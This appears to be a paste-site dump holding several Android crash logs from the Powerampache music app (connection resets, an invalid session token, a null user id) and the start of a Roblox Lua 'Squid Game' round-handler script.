error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":71},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167888358,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
VVnANyZZ,2025-07-19T19:38:12.343,powerampache,PHP,Saturday 19th of July 2025 12:38:12 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":70},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167884971,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":70},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167884971,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
Z3RxSPNi,2025-07-19T20:30:47.869140,powerampache,PHP,Saturday 19th of July 2025 12:30:48 PM CDT,"1.00-68 (68) - DB: 82
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""album_songs"",""errorCode"":""4701"",""errorMessage"":""Invalid Login - invalid session token"",""errorType"":""system""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$getSongsFromAlbum$2.invokeSuspend(SongsRepositoryImpl.kt:246)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9638)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

getSongsFromAlbum() - {""errorAction"":""album_songs"",""errorCode"":""4701"",""errorMessage"":""Invalid Login - invalid session token"",""errorType"":""system""}"
LrcvjpiC,2025-07-19T20:30:47.866376,powerampache,PHP,Saturday 19th of July 2025 12:30:48 PM CDT,"1.00-68 (68) - DB: 82
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
FdUrnecZ,Untitled,Scripting_King,Lua,Saturday 19th of July 2025 12:07:06 PM CDT,"--[[ 
Squid Game Round Handler
uses knit service
]]
--by the_king_here
--Geting Modules
local Knit = require(game:GetService(""ReplicatedStorage"").Packages.Knit)
local Manager = require(game.ServerScriptService.PlayerData.Manager)

--//SERVICES
local TweenService = game:GetService(""TweenService"")
local RunService = game:GetService(""RunService"")
local MPS = game:GetService(""MarketplaceService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local InsertService = game:GetService(""InsertService"")
local SoundService = game:GetService(""SoundService"")

--Creating knit service
local MapHandlerService = Knit.CreateService{
	Name = ""MapHandlerService"",
	--these are events similar to remoteEvents which can be used to communicate with client
	Client = {
		Timer = Knit.CreateSignal(),
		Message = Knit.CreateSignal(),
		AnimateRopes = Knit.CreateSignal(),
		BlockGoingBack = Knit.CreateSignal(),
		RoundEnd = Knit.CreateSignal(),
		NameTag = Knit.CreateSignal(),
		UpdateRewardStatus = Knit.CreateSignal(),
		MusicEvent = Knit.CreateSignal(), 
		SquidMusic = Knit.CreateSignal(), 
	}
}


--//VARIABLES
local Maps = workspace:FindFirstChild(""Maps"")

local notificationRemote = ReplicatedStorage.Events:WaitForChild(""NotificationRemote"") -- RemoteEvent for notifications/it sends notification/message to all player or specific player

local RedlightSound = Maps.HadRopeMap.Doll.HumanoidRootPart:FindFirstChild(""RedLight"") --refrence to the sound that plays when the light turns red
local GreenLightSound = Maps.HadRopeMap.Doll.HumanoidRootPart:FindFirstChild(""GreenLight"") --refrence to the sound that plays when the light turns green

